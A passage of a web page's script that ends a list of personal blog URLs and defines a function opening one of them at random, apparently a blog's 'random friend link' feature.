nxue.com/homepage-949925.htm","https://www.henry-blog.life/henry-blog","https://www.yuque.com/cyber1c3","https://blog.imzjw.cn/","https://zfe.space/","https://blog.hclonely.com/","https://whb1990.github.io/","https://nickxu.me/","https://benpaodewoniu.github.io/","https://www.antmoe.com/","https://immmmm.com/"];function toRandomFlink(){window.open(flinks[Math.floor(Math.random()*flinks.length)])}</script>